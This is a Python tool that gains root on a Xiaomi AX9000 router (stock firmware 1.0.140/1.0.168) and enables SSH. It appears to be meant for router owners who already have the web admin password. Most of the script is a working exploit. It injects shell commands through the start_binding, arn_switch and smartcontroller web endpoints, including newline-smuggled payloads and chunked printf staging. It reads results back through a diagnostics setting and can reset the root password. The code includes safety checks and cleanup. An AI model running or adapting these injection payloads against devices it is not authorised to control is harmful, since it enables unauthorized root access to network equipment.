#!/usr/bin/env python3
"""AX9000 authenticated Web SSH opener, inspired by XMiR-Patcher menu 2.

Standard library only; no automatic scanning, Bdata writes or SSH replacement.
"""

import argparse
import base64
import datetime
import getpass
import gzip
import hashlib
import ipaddress
import json
from pathlib import Path
import re
import secrets
import shlex
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

VERSION = "1.0.0"
METHODS = ("start_binding", "arn_switch", "smartcontroller")
DIAG_KEY = "iperf_test_thr"


class OpenError(Exception):
    pass


class NetworkError(OpenError):
    pass


class SameRouterRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        old, new = urllib.parse.urlsplit(req.full_url), urllib.parse.urlsplit(newurl)
        if (old.scheme, old.netloc) != (new.scheme, new.netloc):
            raise OpenError("拒绝跳转到其他主机或协议。")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Router:
    def __init__(self, host, web_port=80, timeout=8):
        self.base = "http://{}:{}/cgi-bin/luci/".format(host, web_port)
        self.timeout = timeout
        self.stok = None
        self.info = {}
        self.login_key = None
        self.device_id = None
        self.encrypt_mode = 0
        # LAN requests must not inherit HTTP_PROXY/HTTPS_PROXY from WSL.
        self.http = urllib.request.build_opener(
            urllib.request.ProxyHandler({}), SameRouterRedirect())

    def request(self, endpoint, params=None, post=False, authenticated=True,
                timeout=None, allow_error=False):
        if authenticated:
            if not self.stok:
                raise OpenError("尚未登录 Web 后台。")
            path = ";stok={}/api/{}".format(self.stok, endpoint)
        else:
            path = endpoint
        data = urllib.parse.urlencode(params or {}).encode("utf-8")
        url = self.base + path
        if not post and data:
            url += "?" + data.decode("ascii")
        request = urllib.request.Request(url, data=data if post else None, headers={
            "User-Agent": "AX9000-SSH-Open/" + VERSION,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        })
        try:
            with self.http.open(request, timeout=timeout or self.timeout) as response:
                body = response.read(262145)
        except urllib.error.HTTPError as exc:
            if not allow_error or exc.code not in (400, 404, 500, 502, 504):
                raise OpenError("Web 接口返回 HTTP {}；未输出含令牌的 URL。".format(exc.code)) from None
            body = exc.read(262145)
        except (urllib.error.URLError, TimeoutError, OSError):
            raise NetworkError("Web 请求超时或连接失败；已发送的命令可能仍在执行。") from None
        if len(body) > 262144:
            raise OpenError("Web 响应过长，已停止处理。")
        return body.decode("utf-8", "replace")

    def api(self, endpoint, params=None, post=False, authenticated=True):
        text = self.request(endpoint, params, post, authenticated)
        try:
            result = json.loads(text)
        except (ValueError, TypeError):
            raise OpenError("Web 接口没有返回有效 JSON。") from None
        if not isinstance(result, dict) or result.get("code") != 0:
            raise OpenError("Web 接口拒绝请求；请核对密码、固件和接口支持情况。")
        return result

    def detect(self):
        page = self.request("web", authenticated=False)
        self.info = self.api("api/xqsystem/init_info", authenticated=False)
        if self.info.get("inited") != 1:
            raise OpenError("请先完成路由器 Web 初始化。")

        def find(pattern):
            match = re.search(pattern + r"\s*['\"]([^'\"]+)['\"]", page)
            return match.group(1).strip() if match else None

        model = find(r"(?:\bhardware\s*=|\bhardwareVersion\s*:)")
        model = (model or self.info.get("hardware", "")).upper()
        rom = find(r"\bromVersion\s*:") or self.info.get("romversion")
        if model != "RA70" or rom not in ("1.0.140", "1.0.168"):
            raise OpenError("只接受 AX9000 / RA70 原厂 1.0.140、1.0.168，实际为 {} / {}。".format(model, rom))
        reported = self.info.get("hardware", model).upper()
        reported_rom = self.info.get("romversion", rom)
        if reported != model or reported_rom != rom:
            raise OpenError("页面与设备接口的型号/版本不一致。")
        self.login_key = find(r"\bkey\s*:")
        self.device_id = find(r"\bdeviceId\s*=")
        self.encrypt_mode = self.info.get("newEncryptMode", 0)
        if self.encrypt_mode not in (0, 1):
            raise OpenError("未知 Web 密码摘要模式。")
        return model, rom

    def login(self, password):
        if not self.login_key or not self.device_id:
            raise OpenError("无法从原厂页面读取 Web 登录参数。")
        nonce = "0_{}_{}_{}".format(self.device_id, int(time.time()), secrets.randbelow(9001) + 1000)
        digest = hashlib.sha256 if self.encrypt_mode else hashlib.sha1
        first = digest((password + self.login_key).encode("utf-8")).hexdigest()
        encoded = digest((nonce + first).encode("utf-8")).hexdigest()
        result = self.api("api/xqsystem/login", {
            "username": "admin", "password": encoded, "logtype": 2, "nonce": nonce,
        }, post=True, authenticated=False)
        token = result.get("token", "")
        if not isinstance(token, str) or not re.fullmatch(r"[a-zA-Z0-9]{16,128}", token):
            raise OpenError("Web 登录未返回有效令牌。")
        self.stok = token

    def diag(self):
        return str(self.api("xqnetwork/diag_get_paras")[DIAG_KEY])

    def restore_diag(self, value):
        self.api("xqnetwork/diag_set_paras", {DIAG_KEY: value}, post=True)
        if self.diag() != value:
            raise OpenError("诊断参数未恢复，请在后台核对 iperf_test_thr。")

    def direct(self, method, command):
        command = command.replace(";", "\n")
        if method == "start_binding":
            endpoint = "xqsystem/start_binding"
            params = {"uid": 1234, "key": "1234' -X \n" + command + "\n logger -t X 'X"}
        else:
            endpoint = "misystem/arn_switch"
            params = {"open": 0, "mode": 1, "level": "\n" + command + "\n"}
        try:
            self.request(endpoint, params, post=True, timeout=3, allow_error=True)
        except NetworkError:
            # A timeout is not proof of failure. Completion must come from readback.
            pass

    def smart(self, params):
        return self.api("xqsmarthome/request_smartcontroller", {
            "payload": json.dumps(params, separators=(",", ":")),
        }, post=True)


class Executor:
    def __init__(self, router, method, progress=print):
        self.router = router
        self.method = method
        self.progress = progress
        self.scene_counter = 0
        self.paths = set()

    def tiny(self, command):
        # sysapi's 100-byte command buffer leaves 21 bytes for the injected command.
        if len(command.encode("ascii")) > 21:
            raise OpenError("smartcontroller 指令超过 21 字节，未发送。")
        self.scene_counter += 1
        minute = self.scene_counter % (24 * 60)
        when = "{}:{}".format(minute // 60, minute % 60)
        scene = self.router.smart({
            "command": "scene_setting", "name": "wsl_" + secrets.token_hex(6),
            "action_list": [{"thirdParty": "xmrouter", "delay": 17, "type": "wan_block",
                             "payload": {"command": "wan_block", "mac": "\n" + command + "\n"}}],
            "launch": {"timer": {"time": when, "repeat": "0", "enabled": True}},
        })
        scene_id = scene.get("id")
        if not isinstance(scene_id, (str, int)) or isinstance(scene_id, bool):
            raise OpenError("场景未返回 ID；停止操作，请检查是否残留 wsl_ 场景。")
        try:
            self.router.smart({"command": "scene_start_by_crontab", "time": when, "week": 0})
        finally:
            try:
                self.router.smart({"command": "scene_delete", "id": scene_id})
            except OpenError:
                raise OpenError("无法清理本次场景 ID {}；已停止，未清空其他场景。".format(scene_id)) from None

    def send(self, command):
        if self.method != "smartcontroller":
            self.router.direct(self.method, command)
            return
        # Only root-readable ASCII bootstrap is staged; no bundled binaries.
        # A 9-character path leaves space for one quoted character in 21 bytes.
        # The file contains only the bootstrap, is mode 600, and is removed below.
        path = "/tmp/" + secrets.token_hex(2)
        self.paths.add(path)
        self.tiny("umask 77;>" + path)
        self.tiny("chmod 600 " + path)
        offset = 0
        last_progress = time.monotonic()
        while offset < len(command):
            piece = command[offset:offset + 8]
            if piece.startswith("-"):
                piece = "-"  # printf treats multi-character -options specially.
            while piece:
                literal = piece.replace("%", "%%")
                # Bare digits immediately before >> are parsed as an I/O number.
                quoted = "'" + literal + "'" if literal.isdecimal() else shlex.quote(literal)
                append = "printf " + quoted + ">>" + path
                if len(append) <= 21:
                    break
                piece = piece[:-1]
            if not piece:
                raise OpenError("无法编码 smartcontroller 指令。")
            self.tiny(append)
            offset += len(piece)
            if time.monotonic() - last_progress >= 10 or offset == len(command):
                self.progress("smartcontroller 传输 {}/{} 字符……".format(offset, len(command)))
                last_progress = time.monotonic()
        self.tiny("sh " + path)

    def run(self, script, timeout=20):
        marker = "WSL_" + secrets.token_hex(12)
        delimiter = "PAYLOAD_" + secrets.token_hex(12)
        collector = ("umask 077\nout=$(sh <<'" + delimiter + "' 2>&1\n" + script +
                     "\n" + delimiter + "\n)\nrc=$?\n" +
                     'uci set "diag.config.iperf_test_thr=' + marker + ':$rc:$out"\nuci commit diag\n')
        encoded = base64.b64encode(gzip.compress(collector.encode("utf-8"), mtime=0)).decode("ascii")
        self.send("echo " + encoded + "|base64 -d|gzip -dc|sh")
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            value = self.router.diag()
            if value.startswith(marker + ":"):
                parts = value.split(":", 2)
                if len(parts) != 3 or not parts[1].isdigit():
                    raise OpenError("命令结果格式异常。")
                if parts[1] != "0":
                    raise OpenError("路由器检查/操作失败：\n" + parts[2])
                return parts[2]
            time.sleep(0.5)
        raise OpenError("没有收到命令完成标记；未将 HTTP 成功或超时视为执行成功。")

    def close(self):
        for path in sorted(self.paths):
            try:
                self.tiny("rm -f " + path)
            except OpenError:
                self.progress("未能清理临时文件 {}，请恢复连接后手动删除。".format(path))
        self.paths.clear()


def ssh_banner(host, port, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            data = b""
            while len(data) < 8192:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
                if re.search(rb"(?m)^SSH-2\.0-[^\r\n]+\r?$", data):
                    return True
    except OSError:
        pass
    return False


def verify_ssh(host, port, skip=False):
    command = ["ssh", "-p", str(port), "-o", "ConnectTimeout=10",
               "-o", "HostKeyAlgorithms=+ssh-rsa", "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
               "root@" + host, 'test "$(id -u)" = 0 && printf "SSH_ROOT_OK\\n"']
    if skip:
        print("仅确认 SSH 协议响应，尚未验证 root 登录。手动验证：\n" + shlex.join(command))
        return
    print("请核对 SSH 主机指纹，按需输入当前 root 密码。", flush=True)
    if subprocess.call(command) != 0:
        raise OpenError("SSH root 登录验证失败；已经完成的开启/改密不会自动撤销。")
    print("完成：SSH root 登录验证成功。")


def payload(action, password=None):
    script = Path(__file__).with_name("router-open-ssh.sh").read_text(encoding="utf-8")
    change = ": # Keep the existing root password."
    if password is not None:
        change = "printf '%s\\n' {0} {0} | passwd root || fail 'Password change failed; SSH is already started.'".format(shlex.quote(password))
    return "OPEN_ACTION=" + action + "\n" + script.replace("__OPEN_PASSWORD_COMMAND__", change)


def select_executor(router, method):
    choices = METHODS if method == "auto" else (method,)
    for name in choices:
        print("尝试 {}……".format(name), flush=True)
        executor = Executor(router, name)
        try:
            if name == "smartcontroller":
                # Triggering by clock could also run the user's existing scenes.
                # Require an explicitly empty count rather than clearing anything.
                counts = router.smart({"command": "get_scene_count"})
                count = next((counts[k] for k in ("count", "scene_count", "sceneCount") if k in counts), None)
                if isinstance(count, bool) or count not in (0, "0"):
                    raise OpenError("未确认智能场景为空；保留现有场景，停止 smartcontroller 路线。")
                # Enable the scene executor using the current time, never a fake future date.
                clock = router.api("misystem/sys_time")["time"]
                date = datetime.datetime(*(int(clock[k]) for k in ("year", "month", "day", "hour", "min", "sec")))
                zone = clock.get("timezone", "")
                if not isinstance(zone, str) or not re.fullmatch(r"[A-Za-z0-9_+:/.,<>-]{0,96}", zone):
                    raise OpenError("不接受异常时区字符串。")
                router.api("misystem/set_sys_time", {
                    "time": date.strftime("%Y-%m-%d %H:%M:%S"), "timezone": zone,
                }, post=True)
                time.sleep(3.2)
            if executor.run("printf 'ROOT=%s\\n' \"$(id -u)\"", timeout=4) != "ROOT=0":
                raise OpenError("接口命令执行不是 root。")
            return executor
        except BaseException as exc:
            executor.close()
            if not isinstance(exc, OpenError):
                raise
            print("{} 未通过：{}".format(name, exc), flush=True)
    raise OpenError("所选接口未确认可用；固件可能已修复漏洞，没有进行 SSH 配置修改。")


def port_number(value):
    number = int(value)
    if not 1 <= number <= 65535:
        raise argparse.ArgumentTypeError("端口必须为 1–65535。")
    return number


def ipv4(value):
    try:
        address = ipaddress.IPv4Address(value)
    except ValueError:
        raise argparse.ArgumentTypeError("请输入路由器的单个 IPv4 地址。") from None
    if address.is_multicast or address.is_unspecified or int(address) == 0xffffffff:
        raise argparse.ArgumentTypeError("不能使用组播、广播或未指定地址。")
    return str(address)


def main(argv=None):
    parser = argparse.ArgumentParser(description="AX9000 原厂 1.0.140 / 1.0.168：从认证后的 Web 接口开启 SSH，不固化 Bdata。")
    parser.add_argument("host", nargs="?", default="192.168.31.1", type=ipv4)
    parser.add_argument("--check", action="store_true", help="只读型号/版本和检查 SSH 响应；不登录、不探测漏洞")
    parser.add_argument("--method", choices=("auto",) + METHODS, default="auto")
    parser.add_argument("--web-port", type=port_number, default=80)
    parser.add_argument("--ssh-port", type=port_number, default=22, help="初始 SSH 检查端口；开启后也会读取实际配置")
    parser.add_argument("--set-password", action="store_true", help="开启时隐藏输入并设置新的 root 密码；默认保留密码")
    parser.add_argument("--skip-ssh-login", action="store_true", help="只检查 SSH 响应，跳过实际 root 登录验证")
    parser.add_argument("--version", action="version", version=VERSION)
    args = parser.parse_args(argv)
    if not args.check and not args.skip_ssh_login and not shutil.which("ssh"):
        raise OpenError("请先安装 OpenSSH 客户端：sudo apt install openssh-client")
    router = Router(args.host, args.web_port)
    model, rom = router.detect()
    print("设备：{} / {}，地址 {}。".format(model, rom, args.host))
    active = ssh_banner(args.host, args.ssh_port)
    if args.check:
        print("端口 {}：{}；只读检查不能判断漏洞是否可用。".format(args.ssh_port, "有 SSH 响应" if active else "未收到 SSH 响应"))
        return
    if active:
        print("已有 SSH 响应，跳过 Web 漏洞和配置修改。")
        if args.set_password:
            raise OpenError("已有 SSH；请登录后用 passwd root 改密，本工具未修改密码。")
        verify_ssh(args.host, args.ssh_port, args.skip_ssh_login)
        return
    router.login(getpass.getpass("路由器 Web 管理密码："))
    original_diag = router.diag()
    if not re.fullmatch(r"-?[0-9]+", original_diag):
        raise OpenError("诊断值不是可安全恢复的数字，未开始漏洞尝试。")
    executor = None
    started = False
    try:
        executor = select_executor(router, args.method)
        result = executor.run(payload("inspect"))
        if "INSPECT_OK=1" not in result:
            raise OpenError("缺少固件与启动脚本检查标记。")
        ports = list(dict.fromkeys(int(v) for v in re.findall(r"(?m)^PORT=(\d+)$", result) if 1 <= int(v) <= 65535))
        if not ports:
            raise OpenError("无法读取有效 SSH 端口。")
        already = next((p for p in ports if ssh_banner(args.host, p)), None)
        if already:
            print("配置中的端口 {} 已有 SSH，跳过配置和密码修改。".format(already))
            port = already
        else:
            password = None
            if args.set_password:
                password = getpass.getpass("新的 root 密码（至少 8 字符）：")
                confirm = getpass.getpass("再次输入新密码：")
                if password != confirm or len(password) < 8 or any(ord(c) < 32 or ord(c) == 127 for c in password):
                    raise OpenError("密码不一致、少于 8 字符或含控制字符；未修改 SSH 配置。")
                del confirm
            print("启动脚本检查通过，开始备份并开启原厂 SSH。", flush=True)
            started = True
            result = executor.run(payload("apply", password), timeout=30)
            password = None
            print(result)
            if "SSH_OPEN_OK=1" not in result:
                raise OpenError("缺少开启完成标记。")
            deadline = time.monotonic() + 15
            port = None
            while port is None and time.monotonic() < deadline:
                port = next((p for p in ports if ssh_banner(args.host, p)), None)
                if port is None:
                    time.sleep(1)
            if port is None:
                raise OpenError("SSH 未响应；请检查当前服务、端口和已打印的备份。")
            print("保留现有 root 密码。" if not args.set_password else "已执行显式请求的 root 改密。")
    except (OpenError, KeyboardInterrupt):
        if started:
            print("开启请求已发送，修改可能已生效；后续失败/断线不表示已回滚。", file=sys.stderr)
        raise
    finally:
        if executor:
            executor.close()
        # A restore failure must not be reported as a successful overall operation.
        router.restore_diag(original_diag)
    # Interactive login only begins after diagnostic state and staging are cleaned.
    verify_ssh(args.host, port, args.skip_ssh_login)


if __name__ == "__main__":
    try:
        main()
    except (OpenError, OSError, ValueError, KeyError) as exc:
        print("错误：{}".format(exc), file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n已中止；请核对路由器当前状态。", file=sys.stderr)
        sys.exit(130)
